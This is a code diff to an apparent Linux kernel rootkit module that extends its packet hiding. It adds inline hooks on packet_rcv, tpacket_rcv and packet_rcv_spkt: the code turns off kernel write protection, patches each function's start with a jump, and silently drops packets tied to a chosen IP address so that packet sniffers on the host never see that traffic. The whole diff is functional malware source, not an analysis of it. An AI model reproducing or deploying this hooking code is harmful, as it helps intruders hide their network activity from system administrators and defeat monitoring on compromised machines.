@@ -20,7 +20,11 @@ int hide(struct sk_buff *);
 
 //Variable for packet_rcv function
 char original_code_packet_rcv[JUMP_CODE_SIZE];
-int brootus_packet_rcv(struct sk_buff* skb, struct net_device* dev, struct packet_type* pt, struct net_device* orig_dev);
+char original_code_tpacket_rcv[JUMP_CODE_SIZE];
+char original_code_packet_rcv_spkt[JUMP_CODE_SIZE];
+int manipulated_packet_rcv(struct sk_buff* skb, struct net_device* dev, struct packet_type* pt, struct net_device* orig_dev);
+int manipulated_tpacket_rcv(struct sk_buff* skb, struct net_device* dev, struct packet_type* pt, struct net_device* orig_dev);
+int manipulated_packet_rcv_spkt(struct sk_buff* skb, struct net_device* dev, struct packet_type* pt, struct net_device* orig_dev);
 
 void
 hook_packet_rcv(void)
@@ -30,9 +34,46 @@ hook_packet_rcv(void)
 	/* disable write protection */
 	disable_page_protection();
 	
-	*jump_addr = (unsigned int *) brootus_packet_rcv;
+	*jump_addr = (unsigned int *) manipulated_packet_rcv;
 	memcpy(original_code_packet_rcv, fn_packet_rcv, JUMP_CODE_SIZE);
 	memcpy(fn_packet_rcv, jump_code, JUMP_CODE_SIZE);
+	
+	/* reenable write protection */
+	enable_page_protection();
+
+	spin_unlock_irqrestore(&pack_lock, flags);
+}
+
+void
+hook_tpacket_rcv(void)
+{
+	spin_lock_irqsave(&pack_lock, flags);
+
+	/* disable write protection */
+	disable_page_protection();
+	
+	*jump_addr = (unsigned int *) manipulated_tpacket_rcv;
+	memcpy(original_code_tpacket_rcv, fn_tpacket_rcv, JUMP_CODE_SIZE);
+	memcpy(fn_tpacket_rcv, jump_code, JUMP_CODE_SIZE);
+	
+	/* reenable write protection */
+	enable_page_protection();
+
+	spin_unlock_irqrestore(&pack_lock, flags);
+}
+
+
+void
+hook_packet_rcv_spkt(void)
+{
+	spin_lock_irqsave(&pack_lock, flags);
+
+	/* disable write protection */
+	disable_page_protection();
+	
+	*jump_addr = (unsigned int *) manipulated_packet_rcv_spkt;
+	memcpy(original_code_packet_rcv_spkt, fn_packet_rcv_spkt, JUMP_CODE_SIZE);
+	memcpy(fn_packet_rcv_spkt, jump_code, JUMP_CODE_SIZE);
 	
 	/* reenable write protection */
 	enable_page_protection();
@@ -56,18 +97,93 @@ restore_packet_rcv(void)
 	spin_unlock_irqrestore(&pack_lock, flags);
 }
 
-int brootus_packet_rcv(struct sk_buff* skb, struct net_device* dev, struct packet_type* pt, struct net_device* orig_dev)
+void
+restore_tpacket_rcv(void)
+{
+	spin_lock_irqsave(&pack_lock, flags);
+	
+	/* disable write protection */
+	disable_page_protection();
+
+	memcpy(fn_tpacket_rcv, original_code_tpacket_rcv, JUMP_CODE_SIZE); //TODO
+
+	/* reenable write protection */
+	enable_page_protection();
+
+	spin_unlock_irqrestore(&pack_lock, flags);
+}
+
+
+void
+restore_packet_rcv_spkt(void)
+{
+	spin_lock_irqsave(&pack_lock, flags);
+	
+	/* disable write protection */
+	disable_page_protection();
+
+	memcpy(fn_packet_rcv_spkt, original_code_packet_rcv_spkt, JUMP_CODE_SIZE); 
+
+	/* reenable write protection */
+	enable_page_protection();
+
+	spin_unlock_irqrestore(&pack_lock, flags);
+}
+
+
+int manipulated_packet_rcv(struct sk_buff* skb, struct net_device* dev, struct packet_type* pt, struct net_device* orig_dev)
 {
 	int ret;
 
-	ROOTKIT_DEBUG("Entering hooked func");
+	//ROOTKIT_DEBUG("Entering hooked func");
 	
 	if(hide(skb))
+	{	
+		ROOTKIT_DEBUG("Dropped the packet in 1"); 
 		return 0; 
+	}
 
 	restore_packet_rcv();
-	ret = fn_packet_rcv(skb,dev,pt,orig_dev);// TODO
+	ret = fn_packet_rcv(skb,dev,pt,orig_dev);
 	hook_packet_rcv();
+	
+	return ret;	
+}
+
+int manipulated_tpacket_rcv(struct sk_buff* skb, struct net_device* dev, struct packet_type* pt, struct net_device* orig_dev)
+{
+	int ret;
+
+	//ROOTKIT_DEBUG("Entering hooked func");
+	
+	if(hide(skb))
+	{	
+		ROOTKIT_DEBUG("Dropped the packet in 2"); 
+		return 0; 
+	}
+
+	restore_tpacket_rcv();
+	ret = fn_tpacket_rcv(skb,dev,pt,orig_dev);
+	hook_tpacket_rcv();
+	
+	return ret;	
+}
+
+int manipulated_packet_rcv_spkt(struct sk_buff* skb, struct net_device* dev, struct packet_type* pt, struct net_device* orig_dev)
+{
+	int ret;
+
+	//ROOTKIT_DEBUG("Entering hooked func");
+	
+	if(hide(skb))
+	{	
+		ROOTKIT_DEBUG("Dropped the packet in 3"); 
+		return 0; 
+	} 
+
+	restore_packet_rcv_spkt();
+	ret = fn_packet_rcv_spkt(skb,dev,pt,orig_dev);
+	hook_packet_rcv_spkt();
 	
 	return ret;	
 }
@@ -98,6 +214,8 @@ void hook_packets(char *ipv4_addr)
 	host_ip = *(unsigned int *)dst; 
 	
 	hook_packet_rcv();
+	hook_tpacket_rcv();
+	hook_packet_rcv_spkt();
 }
 
 /* unhooks all functions */
@@ -106,4 +224,6 @@ void unhook_packets(void)
         ROOTKIT_DEBUG("Unhooking everything... bye!\n");
 
 	restore_packet_rcv();
+	restore_tpacket_rcv();
+	restore_packet_rcv_spkt();
 }
